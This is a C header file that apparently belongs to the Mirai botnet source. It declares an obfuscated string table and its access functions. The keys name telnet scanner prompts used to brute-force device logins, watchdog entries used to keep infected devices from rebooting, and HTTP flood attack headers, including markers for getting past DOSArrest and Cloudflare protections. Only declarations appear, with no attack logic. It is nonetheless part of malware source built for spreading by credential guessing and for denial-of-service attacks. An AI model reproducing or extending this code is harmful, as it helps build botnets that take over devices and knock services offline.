#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value {
    char *val;
    uint16_t val_len;
#ifdef DEBUG
    BOOL locked;
#endif
};

#define TABLE_KEY_LEN (sizeof(table_keys) / sizeof(*table_keys))

#define TABLE_EXEC_SUCCESS          0
#define TABLE_SCAN_SHELL            1
#define TABLE_SCAN_ENABLE           2
#define TABLE_SCAN_SYSTEM           3
#define TABLE_SCAN_SH               4
#define TABLE_SCAN_LSHELL           5
#define TABLE_SCAN_QUERY            6
#define TABLE_SCAN_RESP             7
#define TABLE_SCAN_NCORRECT         8
#define TABLE_SCAN_ASSWORD          9
#define TABLE_SCAN_OGIN             10
#define TABLE_SCAN_ENTER            11
#define TABLE_WATCHDOG_1            12
#define TABLE_WATCHDOG_2            13
#define TABLE_WATCHDOG_3            14
#define TABLE_WATCHDOG_4            15
#define TABLE_WATCHDOG_5            16
#define TABLE_WATCHDOG_6            17
#define TABLE_WATCHDOG_7            18
#define TABLE_HTTP_ONE              19
#define TABLE_HTTP_TWO              20
#define TABLE_HTTP_THREE            21
#define TABLE_HTTP_FOUR             22
#define TABLE_HTTP_FIVE             23
#define TABLE_ATK_KEEP_ALIVE        24
#define TABLE_ATK_ACCEPT            25
#define TABLE_ATK_ACCEPT_LNG        26
#define TABLE_ATK_CONTENT_TYPE      27 
#define TABLE_ATK_SET_COOKIE        28
#define TABLE_ATK_REFRESH_HDR       29
#define TABLE_ATK_LOCATION_HDR      30
#define TABLE_ATK_SET_COOKIE_HDR    31
#define TABLE_ATK_CONTENT_LENGTH_HDR    32
#define TABLE_ATK_TRANSFER_ENCODING_HDR 33 
#define TABLE_ATK_CHUNKED               34
#define TABLE_ATK_KEEP_ALIVE_HDR        35  
#define TABLE_ATK_CONNECTION_HDR        36  
#define TABLE_ATK_DOSARREST             37  
#define TABLE_ATK_CLOUDFLARE_NGINX      38 

#define TABLE_MAX_KEYS              39

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t);
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
